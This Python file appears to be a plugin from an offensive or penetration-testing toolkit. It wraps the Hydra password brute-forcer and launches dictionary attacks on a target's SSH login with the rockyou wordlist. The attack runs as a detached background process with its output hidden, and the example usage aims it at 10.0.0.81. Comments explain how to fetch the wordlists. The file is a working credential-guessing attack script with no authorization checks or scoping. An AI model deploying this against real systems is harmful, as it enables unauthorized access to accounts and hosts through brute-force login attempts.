# plugins/hydra_plugin.py
# to test if files exist:
# ls /usr/share/wordlists/rockyou.txt
# ls /usr/share/seclists/Usernames/top-usernames-shortlist.txt
# if not:
# sudo apt install seclists
# gzip -d /usr/share/wordlists/rockyou.txt.gz


# plugins/hydra_plugin.py

import os
import time
import subprocess
from pathlib import Path

def run_hydra_attack(
    target_ip,
    service="ssh",
    login_file="/usr/share/wordlists/usernames.txt",
    pass_file="/usr/share/wordlists/rockyou.txt",
    log_dir="logs/hydra"
):
    """
    Launches Hydra as a background process.
    """
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    timestamp = int(time.time())
    log_path = os.path.join(log_dir, f"hydra_{target_ip}_{timestamp}.log")

    cmd = [
        "nohup", "hydra",
        "-L", login_file,
        "-P", pass_file,
        target_ip, service,
        "-o", log_path
    ]

    subprocess.Popen(
        cmd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        preexec_fn=os.setpgrp  # run in background
    )

    print(f"[hydra_plugin] Hydra attack launched on {target_ip}:{service}, logging to {log_path}")

    return {
        "log": log_path,
        "target": target_ip,
        "timestamp": timestamp,
        "service": service
    }

# Example usage for testing
if __name__ == "__main__":
    run_hydra_attack("10.0.0.81")



